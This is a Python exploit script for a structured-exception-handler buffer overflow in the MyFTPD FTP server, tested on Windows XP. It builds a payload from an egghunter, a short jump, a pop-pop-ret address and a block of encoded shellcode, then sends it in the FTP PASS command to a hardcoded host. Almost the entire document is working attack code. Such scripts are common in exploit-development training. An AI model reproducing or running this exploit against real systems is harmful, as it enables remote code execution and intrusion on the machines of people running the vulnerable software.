# Author: Michael Music
# Date: 9/18/2019
# Description: MyFTPD SEH overwrite based BOF
#  Tested on Windows XP

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

egghunter = '\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8' + '\x77\x30\x30\x74' + '\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7'

#crash = 'A' * 1000
crash = ''
crash += 'A' * (797 - (len(egghunter)) - 4)
crash += egghunter
crash += '\x90' * 4

# nSEH
crash += '\xEB\xB8\x90\x90'

# SEH
# PPR found at 0x00414226 within the exe module
crash += '\x26\x42\x41\x00'

# Shellcode
buf =  ""
buf += "\xda\xc3\xbf\x98\x25\xbc\x1b\xd9\x74\x24\xf4\x5e\x29"
buf += "\xc9\xb1\x52\x31\x7e\x17\x03\x7e\x17\x83\x76\xd9\x5e"
buf += "\xee\x7a\xca\x1d\x11\x82\x0b\x42\x9b\x67\x3a\x42\xff"
buf += "\xec\x6d\x72\x8b\xa0\x81\xf9\xd9\x50\x11\x8f\xf5\x57"
buf += "\x92\x3a\x20\x56\x23\x16\x10\xf9\xa7\x65\x45\xd9\x96"
buf += "\xa5\x98\x18\xde\xd8\x51\x48\xb7\x97\xc4\x7c\xbc\xe2"
buf += "\xd4\xf7\x8e\xe3\x5c\xe4\x47\x05\x4c\xbb\xdc\x5c\x4e"
buf += "\x3a\x30\xd5\xc7\x24\x55\xd0\x9e\xdf\xad\xae\x20\x09"
buf += "\xfc\x4f\x8e\x74\x30\xa2\xce\xb1\xf7\x5d\xa5\xcb\x0b"
buf += "\xe3\xbe\x08\x71\x3f\x4a\x8a\xd1\xb4\xec\x76\xe3\x19"
buf += "\x6a\xfd\xef\xd6\xf8\x59\xec\xe9\x2d\xd2\x08\x61\xd0"
buf += "\x34\x99\x31\xf7\x90\xc1\xe2\x96\x81\xaf\x45\xa6\xd1"
buf += "\x0f\x39\x02\x9a\xa2\x2e\x3f\xc1\xaa\x83\x72\xf9\x2a"
buf += "\x8c\x05\x8a\x18\x13\xbe\x04\x11\xdc\x18\xd3\x56\xf7"
buf += "\xdd\x4b\xa9\xf8\x1d\x42\x6e\xac\x4d\xfc\x47\xcd\x05"
buf += "\xfc\x68\x18\x89\xac\xc6\xf3\x6a\x1c\xa7\xa3\x02\x76"
buf += "\x28\x9b\x33\x79\xe2\xb4\xde\x80\x65\x7b\xb6\x8b\x72"
buf += "\x13\xc5\x8b\x7d\x58\x40\x6d\x17\x8e\x05\x26\x80\x37"
buf += "\x0c\xbc\x31\xb7\x9a\xb9\x72\x33\x29\x3e\x3c\xb4\x44"
buf += "\x2c\xa9\x34\x13\x0e\x7c\x4a\x89\x26\xe2\xd9\x56\xb6"
buf += "\x6d\xc2\xc0\xe1\x3a\x34\x19\x67\xd7\x6f\xb3\x95\x2a"
buf += "\xe9\xfc\x1d\xf1\xca\x03\x9c\x74\x76\x20\x8e\x40\x77"
buf += "\x6c\xfa\x1c\x2e\x3a\x54\xdb\x98\x8c\x0e\xb5\x77\x47"
buf += "\xc6\x40\xb4\x58\x90\x4c\x91\x2e\x7c\xfc\x4c\x77\x83"
buf += "\x31\x19\x7f\xfc\x2f\xb9\x80\xd7\xeb\xc7\x71\xe5\xe1"
buf += "\x50\x28\x9c\x4b\x3d\xcb\x4b\x8f\x38\x48\x79\x70\xbf"
buf += "\x50\x08\x75\xfb\xd6\xe1\x07\x94\xb2\x05\xbb\x95\x96"

crash += 'w00tw00t'

# AND esp,0xFFFFFFF0 which is used to make sure ESP is a multiple of 4
# Starting address of the shellcode must be multiple of 4!
crash += '\x83\xE4\xF0\x90\x90\x90'
crash += buf

s.connect(('192.168.1.15', 21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS ' + crash + '\r\n')
s.close
